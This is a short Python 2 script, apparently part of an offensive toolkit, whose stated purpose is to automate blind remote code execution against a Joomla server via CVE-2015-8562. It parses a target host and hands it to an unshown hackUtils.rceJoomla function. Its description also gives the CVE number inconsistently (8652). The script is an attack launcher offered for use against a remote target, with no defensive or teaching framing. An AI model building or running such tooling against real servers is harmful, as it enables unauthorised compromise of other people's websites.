#!/usr/bin/python2

import sys
import console
import colors
import hackUtils
import argparse

parser = argparse.ArgumentParser(prog='cve-2015-8562.py', description='Automate blind RCE for Joomla vuln CVE-2015-8652')
parser.add_argument('-t', dest='RHOST', required=True, help='Remote Target Joomla Server')

args = parser.parse_args()

def main(target):
    if args.RHOST:
        hackUtils.rceJoomla(target)
        pass
    else:
        print '[!] missing arguments'
        parser.print_help()

if __name__ == "__main__":
    try:
        target = args.RHOST
        main(target)
    except KeyboardInterrupt:
        console.print_error("[*] Exiting...")
